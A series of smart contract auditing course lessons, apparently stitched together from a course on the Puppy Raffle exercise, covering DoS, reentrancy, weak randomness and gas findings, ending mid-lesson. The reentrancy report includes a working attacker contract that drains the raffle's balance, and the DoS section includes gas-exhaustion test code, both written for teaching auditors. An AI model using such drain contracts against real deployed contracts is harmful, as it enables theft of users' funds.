---
title: Weak Randomness - Mitigation
---

_Follow along with this video:_

---

### Mitigating Weak Randomness

In short, relying on on-chain data to generate random numbers is problematic due to the deterministic nature of the blockchain. The easiest way to mitigate this is to generate random numbers off-chain.

Some off-chain solutions include:

**Chainlink VRF:** "A provably fair and verifiable random number generator (RNG) that enables smart contracts to access random values without compromising security or usability. For each request, Chainlink VRF generates one or more random values and cryptographic proof of how those values were determined. The proof is published and verified on-chain before any consuming applications can use it. This process ensures that results cannot be tampered with or manipulated by any single entity including oracle operators, miners, users, or smart contract developers." - I encourage you to [**check out the Docs**](https://docs.chain.link/vrf).

**Commit Reveal Scheme:** "The scheme involves two steps: commit and reveal.

During the commit phase, users submit a commitment that contains the hash of their answer along with a random seed value. The smart contract stores this commitment on the blockchain. Later, during the reveal phase, the user reveals their answer and the seed value. The smart contract then checks that the revealed answer and the hash match, and that the seed value is the same as the one submitted earlier. If everything checks out, the contract accepts the answer as valid and rewards the user accordingly." - Read more in this [**Medium Article**](https://medium.com/coinmonks/commit-reveal-scheme-in-solidity-c06eba4091bb)!
---
title: DoS - PoC (Proof of Code)
---

_Follow along with this video:_

---

### Back to Puppy Raffle

Now that we possess a little more context and understanding of what a `Denial of Service` attack is, and what it can mean for a protocol, let's return to Puppy Raffle and remind ourselves where we began.

```js
/// @notice this is how players enter the raffle
/// @notice they have to pay the entrance fee * the number of players
/// @notice duplicate entrants are not allowed
/// @param newPlayers the list of players to enter the raffle
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }

    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    emit RaffleEnter(newPlayers);
}
```

This should look very familiar to us by now:

```js
// Check for duplicates
// @audit Possible DoS
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}
```

At this point I would add this to my `notes.md`, you may want to come back to this later and continue assessing the code back, but let's go ahead and prove this finding now.

### Proof of Code

If the protocol has an existing test suite, it's often easier to add our tests to it then write things from scratch.

Run `forge test` to make sure the test suite is working correctly so far!

There are lots of useful parts of `PuppyRaffle.t.sol` we can use for our PoC.

Now, here's your challenge. I want you to try and write the `Proof of Code` yourself. Build those skills by trying to write a test function that shows the potential `Denial of Service` we've uncovered.


 The Proof of Code 

Great! Now that you've _100%_ tried this yourself, let's go through it together.

I would start by harvesting the existing `testCanEnterRaffle` function. This is a great boilerplate for what we're trying to show.

```js
function testCanEnterRaffle() public {
    address[] memory players = new address[](1);
    players[0] = playerOne;
    puppyRaffle.enterRaffle{value: entranceFee}(players);
    assertEq(puppyRaffle.players(0), playerOne);
}
```

Let's repurpose this!

```js
function testDenialOfService() public {
    // Foundry lets us set a gas price
    vm.txGasPrice(1);

    // Creates 100 addresses
    uint256 playersNum = 100;
    address[] memory players = new address[](playersNum);
    for(uint i = 0; i < players.length; i++){
        players[i] = address(i);
    }

    // Gas calculations for first 100 players
    uint256 gasStart = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
    uint256 gasEnd = gasleft();
    uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
    console.log("Gas cost of the first 100 players: ", gasUsedFirst);
}
```

Running the command `forge test --mt testDenialOfService -vvv` should give us an output like this:



Now let's do the same thing for the second 100 players! We'll need to add something like this to our test.

```js
// Creats another array of 100 players
address[] memory playersTwo = new address[](playersNum);
for (uint256 i = 0; i < playersTwo.length; i++) {
    playersTwo[i] = address(i + playersNum);
}

// Gas calculations for second 100 players
uint256 gasStartTwo = gasleft();
puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
uint256 gasEndTwo = gasleft();
uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;
console.log("Gas cost of the second 100 players: ", gasUsedSecond);

assert(gasUsedFirst < gasUsedSecond);
```

If we rerun our test we can see.. Our test passes! The second 100 players are paying _a LOT_ more and are at a significant disadvantage!





---

### Wrap Up

That's all there is to it. We've clearly shown a potential `Denial of Service` through our `Proof of Code`. This test function is going to go right into our report.

Let's do that now!
---
title: Exploit - Mishandling of Eth
---

_Follow along with this video:_

---

### Eth Handling

Let's pause a moment and focus on this line:

```js
require(address(this.balance) ==
  uint256(totalFees), "PuppyRaffle: there are currently players active!");
```

Effectively, we're checking to assure that we don't withdraw funds that are current in a raffle.

Maybe we're just being extra cautious. The idea behind using `address(this).balance` is that - beyond entering the raffle - there's no way this contract can receive funds, so this require should always be ok ... right?

### No Receive, No Fallback, No Problem.

Puppy Raffle's hope is that without a receive or fallback function, there should never be a way for this accounting to imbalance. Well, let's test it out.

```js
function testCantSendMoneyToRaffle() public {
    address sendAddy = makeAddr("sender");
    vm.deal(sendAddy, 1 ether);
    vm.expectRevert();
    vm.prank(sendAddy);
    (bool success, ) = payable(address(puppyRaffle)).call{value: 1 ether}("");
    require(success);
}
```



Running this test, we discover ... it passes! So we're done, right? Everything's secure?

Not exactly.

### Wrap Up

It may seem like everything is fine here and that the protocol's accounting is secure, but when it comes to the handling of Eth there can be many pitfalls and gotchas you need to look out for.

In the next lesson, we'll return to our [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo to investigate how Puppy Raffle may still be vulnerable in this broad category.
---
title: Reporting - Reentrancy
---

_Follow along with this video:_

---

### Reporting Reentrancy

The next finding on our list is `reentrancy`, we finally get to write this up!

We know this is going to be a high, based on everything we went over and all we learnt about this vulnerability. Keeping in mind ` + `, lets write a suitable title.

---

**Title:**

```
### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance
```

> **Note:** It's often a good idea to go through the steps of building a PoC to prove an issue before taking the time to write things up. We wrote a test for reentracy, that we'll be using, earlier.

On to the next parts of the report template.

---

For our description, we want to detail the specifics of the vulnerability, where it's located and the impact it has, using code snippets is a great way to point to trouble areas being discussed.

````

**Description:** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain the contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that call do we update the `PuppyRaffle::players` array.

```js
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>  payable(msg.sender).sendValue(entranceFee);
@>  players[playerIndex] = address(0);

    emit RaffleRefunded(playerAddress);
}
    ```
````

---

Next up is impact, let's clearly detail the effect of this vulnerability being exploited.

```
**Impact:** All fees paid by raffle entrants could be stolen by a malicious participant.
```

Simple enough.

---

Fortunately we wrote a test for the reentrancy vulnerability earlier, so we can absolutely paste that here. I like to explicitly walk through the steps of the exploit as well.

````
**Proof of Concept:**

1. User enters the raffle
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the PuppyRaffle balance.


PoC Code

Add the following to `PuppyRaffle.t.sol`

    ```js
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}

// test to confirm vulnerability
function testCanGetRefundReentrancy() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
    address attacker = makeAddr("attacker");
    vm.deal(attacker, 1 ether);

    uint256 startingAttackContractBalance = address(attackerContract).balance;
    uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;

    // attack

    vm.prank(attacker);
    attackerContract.attack{value: entranceFee}();

    // impact
    console.log("attackerContract balance: ", startingAttackContractBalance);
    console.log("puppyRaffle balance: ", startingPuppyRaffleBalance);
    console.log("ending attackerContract balance: ", address(attackerContract).balance);
    console.log("ending puppyRaffle balance: ", address(puppyRaffle).balance);
}
    ```

````

---

Last part - Recommendation. We know this, this protocol should be following CEI.

````
**Recommendation:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally we should move the event emission up as well.

    ```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    +   players[playerIndex] = address(0);
    +   emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendeValue(entranceFees);
    -   players[playerIndex] = address(0);
    -   emit RaffleRefunded(playerAddress);
    }
    ```
````

---

Great! That's all there is to our `reentrancy` report. Be sure to mark these audit notes as actioned and we'll move on to the next vulnerability!
---
title: Phase 1 - Scoping
---

_Follow along with this video:_

---

### Puppy Raffle Scoping

Now that you've **definitely** tried reviewing the codebase on your own, let's start scoping things out together.

Take a look at the [**Puppy Raffle Repo**](https://github.com/Cyfrin/4-puppy-raffle-audit)'s README



### README Overview

This README looks pretty good. We've got all the expected sections and necessary details.

Remember the things we're looking for:

- **About**
- **Setup**
- **Scope**
- **Compatibilities**
- **Roles**
- **Known Issues**

We should see clear instructions under [**Getting Started**](https://github.com/Cyfrin/4-puppy-raffle-audit#getting-started) on how to get set up locally.

```bash
git clone https://github.com/Cyfrin/4-puppy-raffle-audit.git
cd 4-puppy-raffle-audit.git
make
```

> Take a brief look at your `Makefile`. It's worthwhile to appreciate what it's actually doing. Our `Makefile` cleans our repo, installs necessary packages (Foundry, OpenZeppelin and base64) and then runs `forge build` to compile everything.

### Testing

Once we've run our `make` command, we should check out the protocol tests. I like to start by running `forge coverage` to see what kind of baseline we're starting with.



Thing's don't look great.

From a competitive audit point of view, this might be exciting, there are lots of opportunities for bugs to be hiding in this codebase.

If we were doing a private audit, we're less optimistic. Poor test coverage is indicative of an immature codebase and we're responsible for securing this protocol!

### README Continued

Further down the README we see the scope details. Invaluable information.

By using the command `git checkout ` we can assure our local repo is the correct version to be auditing.

We also see exactly which contracts are under review.

    ./src/
    └── PuppyRaffle.sol

Moving on, we should take notice of the **Compatibilities** section.



That Solc version is strange - definitely make note of it.

Finally, they've also outlined the Roles of the protocol for us. Knowing this intended functionality is important in being able to spot when things go wrong.

- Owner - Deployer of the protocol, has the power to change the wallet address to which fees are sent through the changeFeeAddress function.
- Player - Participant of the raffle, has the power to enter the raffle with the enterRaffle function and refund value through refund function.

There are no _known_ issues. Hehe.

### Wrap Up

Things are looking great so far, the protocol has provided us with lots of documentation to get started with. We've even spotted an oddity already.

In the next lesson we'll begin using our tools to spot vulnerabilities before we even start.
---
title: Reporting - Should Follow CEI
---

_Follow along with this video:_

---

### selectWinner Should Follow CEI

Taking a look at our next `@Audit` tag, this finding should be another quick one. We'd identified that the `selectWinner` function was another instance where PuppyRaffle isn't following CEI (Checks, Effects, Interactions). However, unlike our `reentrancy` situation, there doesn't seem to be a way to exploit it in `selectWinner`. Resultingly, this is going to be our 4th `informational`.

````
**Title:** [I-4] does not follow CEI, which is not a best practice

It's best to keep code cleaen and follow CEI (Checks, Effects, Interactions).

    ```diff
-   (bool success,) = winner.call{value: prizePool}("");
-   require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
+   (bool success,) = winner.call{value: prizePool}("");
+   require(success, "PuppyRaffle: Failed to send prize pool to winner");
    ```
````

With `informational` findings, you may notice our write ups don't always strictly adhere to outlining things like impact. `Informational` findings are often very subjective in both their impact and their recommended fixes. What defines _clean code_, for example, may vary from developer to developer.

With that said, this write up looks great. Lets move on to `weak randomness` next.
---
title: Test Coverage
---

_Follow along with this video:_

---

### Checking Coverage

Alright! Let's see where we're at in our roadmap

```
Slither ✅
Aderyn ✅
Code Quality/Tests
---
Reporting
- Competitive Audits
    - Submit a finding
- Puppy Raffle Report incl. PoC
```

Test coverage is up next, this should be easy.

> **Remember:** you can check test coverage with the command `forge coverage`.



This is ... pretty bad. In the context of a competitive audit, this may be less important, but in a private audit we should absolutely be calling this out as an informational. Assuring a repo has an adequate test coverage helps a protocol avoid overlooking areas of their code.

In the next lesson, we'll be going over some details to ready ourselves for writing this report. Exciting!
---
title: Exploit - Denial of Service (DoS)
---

_Follow along with this video:_

---

### Denial of Service

Let's dive right in and take a look at the DoS contract brought up in our [**Remix**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/denial-of-service/DoS.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) example.


DoS Contract

```js
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract DoS {
    address[] entrants;

    function enter() public {
        // Check for duplicate entrants
        for (uint256 i; i < entrants.length; i++) {
            if (entrants[i] == msg.sender) {
                revert("You've already entered!");
            }
        }
        entrants.push(msg.sender);
    }
}
```



We can see right away that this `enter` function is doing something very similar to what we saw in `PuppyRaffle::enterRaffle`. Every time someone calls this function, it checks for a duplicate in the `entrants` array, and if one isn't found `msg.sender` is added to `entrants`.

The problem arises when the size of our `entrants` array grows. Every time someone is added to the `entrants` array, another loop is added to the duplicate check and as a result `more gas is consumed`.

### Remix Example

We can see this in action by deploying our contract on Remix and comparing the gas consumed when we call this function subsequent times (remember, you'll need to switch your address being used).

Here's what it looks like for the first four people calling the `enter` function.



This kind of behavior raises questions about fairness and ultimately is going to lead to a `denial of service` in that it will become impractical for anyone to interact with this function, because gas costs will be too high.

### Exploring DoS attack in Foundry

Conveniently, if you clone the [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo. I've included a test suite to illustrate these attack vectors as well.

```bash
git clone https://github.com/Cyfrin/sc-exploits-minimized
cd sc-exploits-minimized
make
```

The above series of commands will clone the repo and build it locally.

Once this is done, I want to draw you attention to `/test/unit/DoSTest.t.sol`

To summarize, this test deploys the same `DoS` contract we've been looking at:

```js
function setUp() public {
        dos = new DoS();
    }
```

Calls the `enter` function and records the gas costs of those calls:

```js
vm.prank(warmUpAddress);
    dos.enter();

    uint256 gasStartA = gasleft();
    vm.prank(personA);
    dos.enter();
    uint256 gasCostA = gasStartA - gasleft();

    uint256 gasStartB = gasleft();
    vm.prank(personB);
    dos.enter();
    uint256 gasCostB = gasStartB - gasleft();

    uint256 gasStartC = gasleft();
    vm.prank(personC);
    dos.enter();
    uint256 gasCostC = gasStartC - gasleft();
```

And finally prints the gas costs and asserts that each call is more expensive than the last:

```js
console2.log("Gas cost A: %s", gasCostA);
console2.log("Gas cost B: %s", gasCostB);
console2.log("Gas cost C: %s", gasCostC);

assert(gasCostC > gasCostB);
assert(gasCostB > gasCostA);
```

If we run this test with `forge test --mt test_denialOfService -vvv` we see that the test indeed passes and we get a print out corroborating the vulnerability!



I challenge you to play with this test a little bit and customize it. See if you can adjust it to print out the gas costs with 1000 entrants!

### Wrap Up

As can be seen, DoS attacks can be very impactful for a protocol. They can inject unfairness and cause interactions to be prohibitively expensive.

In our next lesson we'll be looking at a case study of one such attack.
---
title: DoS - Mitigation
---

_Follow along with this video:_

---

### Recommended Mitigation

Our next step, of course, is providing a recommendation on how to fix this issue.

We may be tempted to suggest something like _"Don't check for duplicates."_, but it's important to preserve the original functionality as much as possible. If we do suggest a change in functionality, we must be clear in explaining why.

With that said, here are some potential suggestions we could make.

1. Consider allowing duplicates. Users can make new wallet addresses anyway, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.

2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a uint256 id, and the mapping would be a player address mapped to the raffle Id.

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

3. Alternatively, you could use [**OpenZeppelin's EnumerableSet library**](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).

### Wrap Up

That's all there is to it! Let's add this recommendation to our `findings.md` report for this vulnerability and we can move on to the next issue!


DoS Writeup

### [M-#] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incrementing gas costs for future entrants

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle:players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array is an additional check the loop will have to make.

```javascript
// @audit Dos Attack
@> for(uint256 i = 0; i < players.length -1; i++){
    for(uint256 j = i+1; j< players.length; j++){
    require(players[i] != players[j],"PuppyRaffle: Duplicate Player");
  }
}
```

**Impact:** The gas consts for raffle entrants will greatly increase as more players enter the raffle, discouraging later users from entering and causing a rush at the start of a raffle to be one of the first entrants in queue.

An attacker might make the `PuppyRaffle:entrants` array so big that no one else enters, guaranteeing themselves the win.

**Proof of Concept:**

If we have 2 sets of 100 players enter, the gas costs will be as such:

- 1st 100 players: ~6252048 gas
- 2nd 100 players: ~18068138 gas

This is more than 3x more expensivee for the second 100 players.


Proof of Code

```js
function testDenialOfService() public {
      // Foundry lets us set a gas price
      vm.txGasPrice(1);

      // Creates 100 addresses
      uint256 playersNum = 100;
      address[] memory players = new address[](playersNum);
      for (uint256 i = 0; i < players.length; i++) {
          players[i] = address(i);
      }

      // Gas calculations for first 100 players
      uint256 gasStart = gasleft();
      puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
      uint256 gasEnd = gasleft();
      uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
      console.log("Gas cost of the first 100 players: ", gasUsedFirst);

      // Creats another array of 100 players
      address[] memory playersTwo = new address[](playersNum);
      for (uint256 i = 0; i < playersTwo.length; i++) {
          playersTwo[i] = address(i + playersNum);
      }

      // Gas calculations for second 100 players
      uint256 gasStartTwo = gasleft();
      puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
      uint256 gasEndTwo = gasleft();
      uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;
      console.log("Gas cost of the second 100 players: ", gasUsedSecond);

      assert(gasUsedSecond > gasUsedFirst);
  }
```




**Recommended Mitigations:** There are a few recommended mitigations.

1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a uint256 id, and the mapping would be a player address mapped to the raffle Id.

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

3. Alternatively, you could use [**OpenZeppelin's EnumerableSet library**](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).


---
title: Reporting - Unchanged State Variables Should Be Immutable Or Constant
---

_Follow along with this video:_

---

### Unchanged State Variables Should Be Constant or Immutable

Searching for our @Audit comment again, it looks like the next finding we identified was:

```js
// @Audit-Gas: raffleDuration doesn't change and should be immutable.
```

Now, just a few lines further in the contract, we've also noted that several variables should be `constant`.

```js
// @Audit-Gas: Unchanged state variables can be marked as constant
string private commonImageUri = "ipfs://QmSsYRx3LpDAb1GZQm7zZ1AuHZjfbPkD6J7s9r41xu1mf8";
string private rareImageUri = "ipfs://QmUPjADFGEKmfohdTaNcWhp7VGk26h5jXDA7v3VtTnTLcW";
string private legendaryImageUri = "ipfs://QmYx6GsYAKnNzZ9A6NvEKV9nf1VaDzJrqDR23Y8YSkebLU";
```

We should compile these into a single gas issue in our `findings.md` document.

```md
#Gas

### [G-1] Unchanged state variables should be declared constant or immutable

Reading from storage is much more expensive than reading a constant or immutable variable.

Instances:

- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`
```

Great! Done! Make note in the contract that we've written up this finding and lets move on to the next.
---
title: Reporting - Storage Variables In Loops Should Be Cached
---

_Follow along with this video:_

---

### Storage Variables in a Loop Should be Cached

Searching again for our `@Audit` tag, we should next come across

```js
// @Audit-Gas: uint256 playerLength = players.length
```

This finding is pointing to a waste of gas incurred by having to always read from storage. In the `enterRaffle` function, Puppy Raffle is checking for duplicates in an inefficient way. We were going to recommend removing this check entirely elsewhere, but we should still report this gas issue.

````md
### [G-2] Storage Variables in a Loop Should be Cached

Everytime you call `players.length` you read from storage, as opposed to memory which is more gas efficient.

```diff
+ uint256 playersLength = players.length;
- for (uint256 i = 0; i < players.length - 1; i++) {
+ for (uint256 i = 0; i < playersLength - 1; i++) {
-    for (uint256 j = i + 1; j < players.length; j++) {
+    for (uint256 j = i + 1; j < playersLength; j++) {
      require(players[i] != players[j], "PuppyRaffle: Duplicate player");
}
}
```
````

Using a diff shows clearly what adjustments should be made to optimized for gas.

Next finding!
---
title: DoS - Reporting
---

_Follow along with this video:_

---

### Denial of Service PoC

Maybe you're the type of security reviewer who likes to save all the write ups to the end. There's nothing wrong with that! As you grow and gain experience you'll begin to carve out your own workflow and ways of doing things.

In future lessons, we may not go through writing things up together, but for now - let's report this uncovered DoS vulnverability

We of course start with our template, create a `findings.md` file and paste this within:

---

### [S-#] TITLE (Root Cause + Impact)

**Description:**

**Impact:**

**Proof of Concept:**

**Recommended Mitigation:**

---

### Title

Remember the rule of thumb!

` + Impact`.

So, what's our root cause? Looping through an array to check for duplicates is the cause. What about the impact? Well, this causes a denial of service due to incrementing gas costs!

So the title I'm going with is something like this:

```
### [S-#] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incrementing gas costs for future entrants
```

What can I say, I like to be verbose, but at least I'm clear!

Regarding severity, let's consider the impact vs likelihood of this scenario.

Impact - The protocol is unlikely to fully break, it simply makes the raffle more expensive to participate in. I might rate this a `Medium`.

Likelihood - If an attacker wants the NFT badly enough, this will surely happen - but it does cost the attacker a lot. I might settle with `Medium` here as well.

With an Impact of `Medium` and a likelihood of `Medium`, this finding's severity is going to be decidedly `Medium`.

Update our title appropriately `[M-#]`.

### When to do Writeups

Often, I won't do a whole writeup as soon as I think I've found something. The reason for this is simple - I might be wrong! It's entirely possible that I come across more information as I dive deeper into the protocol that makes clear that what I thought was an issue actually isn't.

Sometimes I'll just leave my in-line notes indicating my suspicions and come back to them at the end.

For now, let's write the report as though we're confident this is valid.

### Description

Feel free to write your own description! Remember we want to be clear in how we illustrate the vulnerability and its affects.

Here's mine.

```
**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle:players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array is an additional check the loop will have to make.

'''javascript
// @audit Dos Attack
@> for(uint256 i = 0; i < players.length -1; i++){
    for(uint256 j = i+1; j< players.length; j++){
    require(players[i] != players[j],"PuppyRaffle: Duplicate Player");
  }
}
'''
```

### Impact

This is pretty clear from our description, but we can expand on things a little more.

```
**Impact:** The gas consts for raffle entrants will greatly increase as more players enter the raffle, discouraging later users from entering and causing a rush at the start of a raffle to be one of the first entrants in queue.

An attacker might make the `PuppyRaffle:entrants` array so big that no one else enters, guaranteeing themselves the win.
```

### Proof of Concept/Code

We did the hard part of this in our previous lesson, but let's add it to our report.

```
**Proof of Concept:**

If we have 2 sets of 100 players enter, the gas costs will be as such:
- 1st 100 players: ~6252048 gas
- 2nd 100 players: ~18068138 gas

This is more than 3x more expensivee for the second 100 players.


Proof of Code

'''js
function testDenialOfService() public {
      // Foundry lets us set a gas price
      vm.txGasPrice(1);

      // Creates 100 addresses
      uint256 playersNum = 100;
      address[] memory players = new address[](playersNum);
      for (uint256 i = 0; i < players.length; i++) {
          players[i] = address(i);
      }

      // Gas calculations for first 100 players
      uint256 gasStart = gasleft();
      puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
      uint256 gasEnd = gasleft();
      uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
      console.log("Gas cost of the first 100 players: ", gasUsedFirst);

      // Creats another array of 100 players
      address[] memory playersTwo = new address[](playersNum);
      for (uint256 i = 0; i < playersTwo.length; i++) {
          playersTwo[i] = address(i + playersNum);
      }

      // Gas calculations for second 100 players
      uint256 gasStartTwo = gasleft();
      puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
      uint256 gasEndTwo = gasleft();
      uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;
      console.log("Gas cost of the second 100 players: ", gasUsedSecond);

      assert(gasUsedSecond > gasUsedFirst);
  }
'''


```

### Wrap Up

Click below to see what our finding report should look like so far!


DoS Writeup

### [M-#] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incrementing gas costs for future entrants

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle:players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array is an additional check the loop will have to make.

```javascript
// @audit Dos Attack
@> for(uint256 i = 0; i < players.length -1; i++){
    for(uint256 j = i+1; j< players.length; j++){
    require(players[i] != players[j],"PuppyRaffle: Duplicate Player");
  }
}
```

**Impact:** The gas consts for raffle entrants will greatly increase as more players enter the raffle, discouraging later users from entering and causing a rush at the start of a raffle to be one of the first entrants in queue.

An attacker might make the `PuppyRaffle:entrants` array so big that no one else enters, guaranteeing themselves the win.

**Proof of Concept:**

If we have 2 sets of 100 players enter, the gas costs will be as such:

- 1st 100 players: ~6252048 gas
- 2nd 100 players: ~18068138 gas

This is more than 3x more expensivee for the second 100 players.


Proof of Code

```js
function testDenialOfService() public {
      // Foundry lets us set a gas price
      vm.txGasPrice(1);

      // Creates 100 addresses
      uint256 playersNum = 100;
      address[] memory players = new address[](playersNum);
      for (uint256 i = 0; i < players.length; i++) {
          players[i] = address(i);
      }

      // Gas calculations for first 100 players
      uint256 gasStart = gasleft();
      puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
      uint256 gasEnd = gasleft();
      uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
      console.log("Gas cost of the first 100 players: ", gasUsedFirst);

      // Creats another array of 100 players
      address[] memory playersTwo = new address[](playersNum);
      for (uint256 i = 0; i < playersTwo.length; i++) {
          playersTwo[i] = address(i + playersNum);
      }

      // Gas calculations for second 100 players
      uint256 gasStartTwo = gasleft();
      puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
      uint256 gasEndTwo = gasleft();
      uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;
      console.log("Gas cost of the second 100 players: ", gasUsedSecond);

      assert(gasUsedSecond > gasUsedFirst);
  }
```




**Recommended Mitigations:**



---

Things look great! Lets finally have a look at what mitigations we can recommend for this vulnerability, in the next lesson.
---
title: Reporting - Smart Contract Wallet Reverts Winning
---

_Follow along with this video:_

---

### Smart Contract Wallet Reverts Winning

Next vulnerability on our docket is going to be:

```js
//@Audit: winner wouldn't get their money if their fallback was messed up!
```

This is absolutely an issue, our write up for it may be a _little_ lazy, but I think it's an important concept to be aware of.

To assess the severity, we again consider:

